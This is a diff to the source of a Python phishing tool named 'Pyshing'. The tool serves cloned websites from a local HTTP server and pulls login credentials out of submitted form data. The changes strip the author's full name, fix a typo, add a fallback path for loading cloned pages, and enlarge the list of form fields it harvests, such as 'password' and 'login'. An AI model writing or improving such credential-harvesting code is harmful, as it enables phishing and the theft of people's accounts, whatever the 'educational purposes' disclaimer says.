@@ -8,9 +8,7 @@ The tool is for educational purposes
 the author is not responsible for misuse of this software!
 --
 
-Website: https://igor-m-martins.github.io
-
-Author: Igor M. Martins (r4msolo)
+Author: r4msolo
 '''
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from datetime import datetime
@@ -37,7 +35,7 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
           httpd = HTTPServer(('0.0.0.0', int(port)), SimpleHTTPRequestHandler)
         
         except OSError:
-            print(RED+"Adress already in use!\n"+ENDC)
+            print(RED+"Address already in use!\n"+ENDC)
             quit()
 
         try:
@@ -75,7 +73,10 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
       self.end_headers()
       file = open('site/redirect.txt','r')
       url_clone, path = Pyshing.splitUrl(file.read())
-      file = open(f"site/{url_clone[2]}/{path}","r")
+      try:
+        file = open(f"site/{url_clone[2]}/{path}","r")
+      except IndexError:
+        file = open(f"site/{path}","r")
       readfile = file.readlines()
       file.close()
 
@@ -129,8 +130,7 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
         post = unquote(values.decode('utf-8'))
         readpost = post.strip('&')
 
-        forms = ['email','user','pass','encpass','enc_password'] #Possibles forms to get the credentials
-        
+        forms = ['email','login','user','pass','password','encpass','enc_password'] #Possibles forms to get the credentials
         readpost = readpost.split('&')
         count = 0
         possibles = []
